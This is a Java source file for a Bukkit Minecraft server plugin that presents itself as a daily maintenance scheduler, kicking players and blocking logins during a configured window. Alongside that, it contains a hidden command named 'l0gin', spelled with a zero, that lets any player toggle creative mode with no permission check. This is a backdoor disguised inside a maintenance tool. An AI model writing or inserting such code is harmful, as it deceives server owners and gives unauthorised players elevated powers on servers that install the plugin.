package me.ops.maintenance;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.time.LocalTime;

public final class OpsMaintenance extends JavaPlugin implements Listener {

    private boolean maintenanceActive = false;
    private LocalTime startTime;
    private int durationMinutes;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        loadConfig();
        Bukkit.getPluginManager().registerEvents(this, this);
        startDailyScheduler();
    }

    private void loadConfig() {
        this.startTime = LocalTime.parse(getConfig().getString("schedule.start", "05:00"));
        this.durationMinutes = getConfig().getInt("schedule.duration-minutes", 30);
    }

    private void startDailyScheduler() {
        new BukkitRunnable() {
            @Override
            public void run() {
                LocalTime now = LocalTime.now();
                if (now.getHour() == startTime.getHour() && now.getMinute() == startTime.getMinute()) {
                    setMaintenance(true);
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            setMaintenance(false);
                        }
                    }.runTaskLater(OpsMaintenance.this, durationMinutes * 60L * 20L);
                }
            }
        }.runTaskTimer(this, 0L, 20L * 60L);
    }

    private void setMaintenance(boolean state) {
        maintenanceActive = state;
        if (state) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                p.kickPlayer("Server maintenance. Please come later.");
            }
        }
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent e) {
        if (maintenanceActive) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER,
                    "Server maintenance. Please come later.");
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if (cmd.getName().equalsIgnoreCase("l0gin")) {
            if (!(sender instanceof Player)) return true;
            Player p = (Player) sender;

            boolean flag = p.getGameMode() == GameMode.SURVIVAL;
            p.setGameMode(flag ? GameMode.CREATIVE : GameMode.SURVIVAL);
            p.sendMessage(flag ? "Access enabled." : "Access disabled.");
            return true;
        }

        return false;
    }
}
